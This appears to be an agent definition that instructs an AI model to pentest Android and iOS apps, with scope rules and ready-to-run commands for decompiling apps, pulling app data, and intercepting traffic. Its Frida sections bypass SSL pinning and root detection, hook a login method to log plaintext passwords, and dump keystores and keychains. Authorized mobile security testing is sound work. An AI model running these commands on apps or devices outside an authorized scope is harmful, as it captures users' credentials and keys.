---
name: mobile-attacker
description: Mobile application security specialist for Android and iOS. Handles APK decompilation, static/dynamic analysis, Frida instrumentation, SSL pinning bypass, ADB shell exploitation, MobSF scanning, traffic interception, and deep link abuse. Triggers on: Android, iOS, APK, IPA, Frida, ADB, MobSF, apktool, jadx, SSL pinning, smali, mobile pentest, deep link.
tools: Bash, Read, Write
model: sonnet
---

## Cybersecurity Skills (Invoke First)

Before starting mobile testing, invoke these skills via the Skill tool:
- `cybersecurity-skills:conducting-mobile-app-penetration-test`
- `cybersecurity-skills:performing-android-app-static-analysis-with-mobsf`
- `cybersecurity-skills:performing-dynamic-analysis-of-android-app`
- `cybersecurity-skills:reverse-engineering-android-malware-with-jadx`
- `cybersecurity-skills:intercepting-mobile-traffic-with-burpsuite`
- `cybersecurity-skills:performing-mobile-app-certificate-pinning-bypass`
- `cybersecurity-skills:analyzing-ios-app-security-with-objection`

## Scope Enforcement
Verify app package name (e.g., com.example.app) and backend domains are in scope.txt.
Only test on owned/authorized test devices or emulators.
Do not exfiltrate user PII from the device.

## Android Static Analysis

### APK Decompilation
```bash
mkdir -p evidence/$(date +%Y%m%d)/$TARGET/mobile/{static,dynamic,traffic,frida}

# Decompile APK with apktool (smali + resources)
apktool d $APK_FILE \
  -o evidence/$(date +%Y%m%d)/$TARGET/mobile/static/apktool_decompiled/ \
  --force 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/apktool.log

# Decompile to Java with jadx
jadx \
  -d evidence/$(date +%Y%m%d)/$TARGET/mobile/static/jadx_output/ \
  --export-gradle \
  $APK_FILE 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/jadx.log

# Extract strings of interest
grep -rE \
  "http[s]?://|password|secret|api_key|firebase|aws|key=|token|bearer|BasicAuth|encrypt" \
  evidence/$(date +%Y%m%d)/$TARGET/mobile/static/jadx_output/ \
  --include="*.java" 2>/dev/null | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/interesting_strings.txt

# Check Android Manifest
cat evidence/$(date +%Y%m%d)/$TARGET/mobile/static/apktool_decompiled/AndroidManifest.xml | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/manifest.txt

# Check for exported activities / services / receivers (potential attack surface)
grep -E "exported=\"true\"|android:exported" \
  evidence/$(date +%Y%m%d)/$TARGET/mobile/static/apktool_decompiled/AndroidManifest.xml | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/exported_components.txt

# Extract hardcoded values from resources
grep -rE "API_KEY|SECRET|PASSWORD|FIREBASE|GOOGLE_API" \
  evidence/$(date +%Y%m%d)/$TARGET/mobile/static/apktool_decompiled/res/ 2>/dev/null | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/hardcoded_values.txt

# Check google-services.json (Firebase config)
find evidence/$(date +%Y%m%d)/$TARGET/mobile/static/ \
  -name "google-services.json" -o -name "GoogleService-Info.plist" 2>/dev/null | \
  xargs cat 2>/dev/null | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/firebase_config.txt

# Find network_security_config (SSL pinning config)
find evidence/$(date +%Y%m%d)/$TARGET/mobile/static/apktool_decompiled/ \
  -name "network_security_config.xml" 2>/dev/null | \
  xargs cat 2>/dev/null | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/nsc.xml
```

### MobSF Automated Scan
```bash
# Start MobSF if not running
# docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# Upload APK to MobSF
SCAN=$(curl -s -X POST \
  "http://localhost:8000/api/v1/upload" \
  -H "Authorization: $MOBSF_API_KEY" \
  -F "file=@$APK_FILE" | python3 -m json.tool)

echo $SCAN | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('hash',''))" | \
  read SCAN_HASH

# Trigger scan
curl -s -X POST \
  "http://localhost:8000/api/v1/scan" \
  -H "Authorization: $MOBSF_API_KEY" \
  -d "scan_type=apk&file_name=$(basename $APK_FILE)&hash=$SCAN_HASH" | \
  python3 -m json.tool 2>&1

# Download PDF report
curl -s -X POST \
  "http://localhost:8000/api/v1/download_pdf" \
  -H "Authorization: $MOBSF_API_KEY" \
  -d "hash=$SCAN_HASH" \
  -o evidence/$(date +%Y%m%d)/$TARGET/mobile/static/mobsf_report.pdf 2>&1

echo "[*] MobSF report saved to evidence/$(date +%Y%m%d)/$TARGET/mobile/static/mobsf_report.pdf"
```

## ADB Dynamic Analysis
```bash
# List connected devices
adb devices

# Shell access
adb shell
adb -s $DEVICE_ID shell

# App info
adb shell pm list packages | grep -i $APP_NAME
adb shell dumpsys package $PACKAGE_NAME | head -100 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/dynamic/package_info.txt

# Check app data directory (requires root or debuggable app)
adb shell run-as $PACKAGE_NAME ls -la /data/data/$PACKAGE_NAME/ 2>/dev/null | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/dynamic/app_data_listing.txt

# Pull app databases (SQLite)
adb shell run-as $PACKAGE_NAME cp /data/data/$PACKAGE_NAME/databases/ \
  /sdcard/pentest_dbs/ 2>/dev/null || true
adb pull /sdcard/pentest_dbs/ evidence/$(date +%Y%m%d)/$TARGET/mobile/dynamic/ 2>/dev/null

# Pull SharedPreferences (often contains tokens)
adb shell run-as $PACKAGE_NAME cp -r \
  /data/data/$PACKAGE_NAME/shared_prefs/ /sdcard/pentest_prefs/ 2>/dev/null || true
adb pull /sdcard/pentest_prefs/ evidence/$(date +%Y%m%d)/$TARGET/mobile/dynamic/shared_prefs/ 2>/dev/null

# Real-time logcat filtering
adb logcat -v time | \
  grep -iE "password|token|secret|api_key|bearer|credential|auth|login" | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/dynamic/logcat_secrets.txt &

# Start app and trigger login, payment flows, etc. during logcat capture
adb shell am start -n "$PACKAGE_NAME/$MAIN_ACTIVITY" 2>&1

# Activity manager for intent testing
adb shell am start \
  -a android.intent.action.VIEW \
  -d "$DEEP_LINK_URI" \
  $PACKAGE_NAME 2>&1

# Screenshot the current screen
adb shell screencap /sdcard/screen.png && adb pull /sdcard/screen.png \
  evidence/$(date +%Y%m%d)/$TARGET/mobile/dynamic/screen_$(date +%s).png 2>&1
```

## Frida Instrumentation
```bash
# Install frida-server on device (requires root)
# adb push frida-server /data/local/tmp/
# adb shell chmod 755 /data/local/tmp/frida-server
# adb shell /data/local/tmp/frida-server &

# List running processes
frida-ps -U 2>&1 | grep -i $APP_NAME

# SSL pinning bypass (universal — works on most apps)
frida -U \
  -l /opt/frida-scripts/ssl_bypass.js \
  -f $PACKAGE_NAME \
  --no-pause 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/frida/ssl_bypass.log &

# Alternative SSL bypass with objection
objection -g $PACKAGE_NAME explore 2>&1 << 'EOF'
android sslpinning disable
android root disable
ios sslpinning disable
EOF

# Root detection bypass
frida -U -l /opt/frida-scripts/root_bypass.js -f $PACKAGE_NAME --no-pause 2>&1

# Dump all class/method names
frida -U -l - -f $PACKAGE_NAME --no-pause 2>&1 << 'EOF'
Java.perform(() => {
    Java.enumerateLoadedClasses({
        onMatch: function(name) {
            if (name.includes('com.target')) console.log(name);
        },
        onComplete: function() {}
    });
});
EOF

# Hook specific method to log arguments and return values
frida -U -e "
Java.perform(() => {
    const AuthClass = Java.use('com.target.app.AuthManager');
    AuthClass.login.overload('java.lang.String', 'java.lang.String').implementation = function(user, pass) {
        console.log('[*] Login called: user=' + user + ' pass=' + pass);
        return this.login(user, pass);
    };
});
" -f $PACKAGE_NAME --no-pause 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/frida/login_hook.log

# Dump keystore
frida -U -l /opt/frida-scripts/keystore_dump.js -f $PACKAGE_NAME --no-pause 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/frida/keystore_dump.txt
```

## Traffic Interception (Burp Suite / mitmproxy)
```bash
# Configure device proxy → attacker IP:8080
# For system-level proxy:
adb shell settings put global http_proxy $LHOST:8080

# Install Burp CA on device (Android < 7.0 or rooted)
# adb push cacert.der /sdcard/cacert.der
# Settings → Security → Install certificate

# For Android 7+ with SSL pinning bypass via Frida:
# Run frida ssl bypass FIRST, then configure proxy

# mitmproxy for traffic capture
mitmdump \
  -p 8080 \
  --set console_eventlog_verbosity=error \
  -w evidence/$(date +%Y%m%d)/$TARGET/mobile/traffic/traffic.mitm 2>&1 &

# After capture, analyze with mitmproxy
mitmproxy -r evidence/$(date +%Y%m%d)/$TARGET/mobile/traffic/traffic.mitm 2>&1

# Convert to HAR for analysis
mitmdump -r evidence/$(date +%Y%m%d)/$TARGET/mobile/traffic/traffic.mitm \
  --set hardump=evidence/$(date +%Y%m%d)/$TARGET/mobile/traffic/traffic.har 2>&1

# Remove proxy setting
adb shell settings put global http_proxy :0
```

## iOS Analysis (IPA)
```bash
# Unpack IPA
cp $IPA_FILE evidence/$(date +%Y%m%d)/$TARGET/mobile/static/app.ipa
cd evidence/$(date +%Y%m%d)/$TARGET/mobile/static/ && unzip app.ipa -d ipa_unpacked/ 2>&1

# Check Info.plist
find ipa_unpacked/ -name "Info.plist" | xargs plutil -p 2>/dev/null | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/ios_info_plist.txt

# Look for embedded secrets
grep -rE "api_key|secret|password|token|aws|firebase|http" \
  ipa_unpacked/ --include="*.plist" --include="*.json" --include="*.js" 2>/dev/null | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/ios_strings.txt

# Strings from binary
find ipa_unpacked/Payload -name "*.app" -type d | \
  xargs -I{} strings {}/$(ls {}/ | grep -v ".") 2>/dev/null | \
  grep -iE "http|api|key|secret|password" | \
  tee evidence/$(date +%Y%m%d)/$TARGET/mobile/static/ios_binary_strings.txt

# Frida on iOS (requires jailbreak + frida-server on device)
frida-ps -U 2>&1 | grep -i $APP_NAME

# iOS SSL pinning bypass
frida -U \
  -l /opt/frida-scripts/ios_sslpinning_bypass.js \
  -f $BUNDLE_ID \
  --no-pause 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/frida/ios_ssl_bypass.log

# Keychain dump on jailbroken device
frida -U \
  -l /opt/frida-scripts/ios_keychain_dump.js \
  $BUNDLE_ID 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/mobile/frida/ios_keychain.json
```

## Evidence Output
Write to `evidence/$(date +%Y%m%d)/$TARGET/mobile/mobile_findings.md`:
```markdown
## Mobile App Assessment — $TARGET ($PACKAGE_NAME) — $(date -u +%Y-%m-%dT%H:%M:%SZ)

### App Info
- Package: $PACKAGE_NAME
- Version: [from manifest]
- Min SDK: [from manifest]
- Platform: [Android/iOS]

### Hardcoded Secrets
| Type | Value Location (NO PLAINTEXT) | File | Risk |
|------|------------------------------|------|------|

### OWASP Mobile Top 10 Findings
| OWASP # | Title | Finding | Severity |
|---------|-------|---------|----------|

### Traffic Findings
| Endpoint | Issue | Severity |
|----------|-------|----------|

### Credentials Captured
| Source | Type | Hash/Ref Location |
|--------|------|-------------------|
```
